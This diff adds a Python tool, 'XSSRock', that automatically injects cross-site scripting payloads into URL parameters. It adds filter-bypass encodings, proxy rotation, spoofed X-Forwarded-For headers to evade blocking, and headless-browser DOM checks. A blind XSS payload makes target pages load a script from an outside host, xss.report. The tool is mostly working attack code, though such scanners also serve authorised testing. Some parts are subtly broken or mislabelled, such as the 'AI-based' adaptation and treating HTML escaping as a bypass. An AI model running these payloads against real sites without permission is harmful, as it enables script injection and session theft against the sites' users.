@@ -1,0 +1,216 @@
+import argparse
+import requests
+import threading
+import queue
+import random
+import time
+import json
+import base64
+import os
+import re
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from urllib.parse import urlparse, parse_qs, urlencode
+
+# Banner
+def print_banner():
+    banner = """
+==================================================
+🔥 XSSRock - Automated XSS Scanner 🔥
+Created by RockSec | Advanced XSS Detection Suite
+==================================================
+    """
+    print(banner)
+
+# XSS Payloads & Bypass Techniques
+bypass_techniques = [
+    lambda p: base64.b64encode(p.encode()).decode(),
+    lambda p: ''.join(f'&#{ord(c)};' for c in p),
+    lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),
+    lambda p: p.replace('alert', 'a\\lert'),
+    lambda p: f'<!--{p}-->',
+    lambda p: f'/**/{p}/**/',
+    lambda p: f'";{p};"',
+    lambda p: f'<scr<script>ipt>{p}</scr<script>ipt>',
+    lambda p: f'<svg/onload="{p}">',
+    lambda p: f'<img src=x onerror="{p}">',
+    lambda p: f'`{p}`',
+]
+
+default_payloads = [
+    "<script>alert(1)</script>",
+    '"><script>alert(1)</script>',
+    "';alert(1)//",
+    "<svg/onload=alert(1)>",
+    "javascript:alert(1)",
+    '"><img src=x onerror=alert(1)>',
+    '<iframe src="javascript:alert(1)"></iframe>',
+    "document.write('<script>alert(1)</script>');",
+    "<body onload=alert(1)>",
+]
+
+# Store results globally
+xss_findings = []
+lock = threading.Lock()  # Thread-safe operation
+
+# Load proxies
+def load_proxies(proxy_file):
+    proxies = []
+    if proxy_file and os.path.exists(proxy_file):
+        with open(proxy_file, "r") as f:
+            proxies = [line.strip() for line in f if line.strip()]
+    return proxies
+
+# AI-based Payload Adaptation
+def adapt_payload(payload):
+    modified_payloads = [tech(payload) for tech in bypass_techniques]
+    return modified_payloads
+
+# Extract Parameters from URL
+def extract_params(url):
+    parsed_url = urlparse(url)
+    return parse_qs(parsed_url.query)
+
+# Save report after test completion
+def save_final_report():
+    if not xss_findings:
+        print("\n✅ No XSS vulnerabilities found. No report generated.")
+        return
+
+    timestamp = time.strftime("%Y%m%d_%H%M%S")
+    report_file = f"xss_report_{timestamp}.json"
+
+    with open(report_file, "w") as f:
+        json.dump(xss_findings, f, indent=4)
+
+    print(f"\n📄 [SAVED] Final report saved to {report_file}")
+
+# Check for CSP & Bypass
+def check_csp(response):
+    csp_header = response.headers.get("Content-Security-Policy")
+    if not csp_header:
+        return False  
+    bypass_patterns = ["unsafe-inline", "unsafe-eval", "data:", "blob:", "*"]
+    return any(pattern in csp_header for pattern in bypass_patterns)
+
+# Selenium-based DOM XSS Detection
+def detect_dom_xss(url, payload):
+    options = Options()
+    options.add_argument("--headless")
+    driver = webdriver.Chrome(options=options)
+
+    try:
+        driver.get(url)
+        if payload in driver.page_source:
+            print(f"\033[92m[✅] DOM XSS Detected! {url} with {payload}\033[0m")
+            with lock:
+                xss_findings.append({"url": url, "parameter": "DOM", "payload": payload})
+    except Exception as e:
+        print(f"⚠️ [ERROR] Selenium failed - {e}")
+    finally:
+        driver.quit()
+
+# Send Request and Check for XSS
+def send_request(url, param, payload, proxies, webhook):
+    parsed_url = urlparse(url)
+    params = extract_params(url)
+
+    if param not in params:
+        return False
+
+    params[param] = payload
+    new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(params, doseq=True)}"
+    proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
+    headers = {
+        "User-Agent": "Mozilla/5.0 (XSS-Scanner)",
+        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    }
+
+    print(f"🔍 [TESTING] {new_url} with payload: {payload}")
+
+    try:
+        response = requests.get(new_url, headers=headers, proxies=proxy, timeout=5)
+        if payload in response.text:
+            print(f"\033[92m[✅] XSS Found! {new_url}\033[0m")
+            with lock:
+                xss_findings.append({"url": new_url, "parameter": param, "payload": payload})
+
+            if webhook:
+                slack_payload = {"text": f"🚨 *XSS Found!*\n🔗 URL: {new_url}\n💥 Payload: `{payload}`"}
+                requests.post(webhook, json=slack_payload)
+
+            return True
+        elif check_csp(response):
+            print(f"⚠️ [WARNING] CSP detected but can be bypassed.")
+
+    except requests.exceptions.RequestException as e:
+        print(f"⚠️ [ERROR] Failed to test {new_url} - {e}")
+
+    return False
+
+# Blind XSS Injection
+def send_blind_xss(url, param):
+    blind_xss_payload = "<script src='https://xss.report/c/rocksec'></script>"
+    send_request(url, param, blind_xss_payload, [], None)
+
+# Scanner Function
+def scan_xss(url, payloads, proxies, webhook):
+    print(f"\n🚀 [STARTING SCAN] {url}\n" + "-" * 50)
+    params = extract_params(url)
+
+    for param in params:
+        print(f"\n📌 [PARAMETER] Testing parameter: {param}")
+
+        for payload in payloads:
+            send_request(url, param, payload, proxies, webhook)
+
+        send_blind_xss(url, param)
+
+# Multithreaded Worker
+def worker(queue, payloads, proxies, webhook):
+    while not queue.empty():
+        url = queue.get()
+        scan_xss(url, payloads, proxies, webhook)
+        queue.task_done()
+
+# Main Execution
+def main():
+    print_banner()
+
+    parser = argparse.ArgumentParser(description="🔥 Python XSS Scanner 🔥")
+    parser.add_argument("-u", "--url", help="Test a single URL")
+    parser.add_argument("-f", "--file", help="File containing URLs")
+    parser.add_argument("-p", "--payloads", help="File or directory containing payloads")
+    parser.add_argument("-w", "--webhook", help="Slack Webhook URL for notifications")
+    parser.add_argument("--proxy", help="File containing proxy list (optional)")
+    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
+
+    args = parser.parse_args()
+    proxies = load_proxies(args.proxy)
+
+    payloads = default_payloads
+    if args.payloads:
+        with open(args.payloads, "r") as f:
+            payloads = [line.strip() for line in f if line.strip()]
+
+    adapted_payloads = [p for payload in payloads for p in adapt_payload(payload)]
+    payloads.extend(adapted_payloads)
+
+    url_queue = queue.Queue()
+    if args.url:
+        url_queue.put(args.url)
+    elif args.file:
+        with open(args.file, "r") as f:
+            for line in f:
+                url_queue.put(line.strip())
+
+    threads = [threading.Thread(target=worker, args=(url_queue, payloads, proxies, args.webhook)) for _ in range(args.threads)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+
+    save_final_report()  # Save report at the end
+
+if __name__ == "__main__":
+    main()
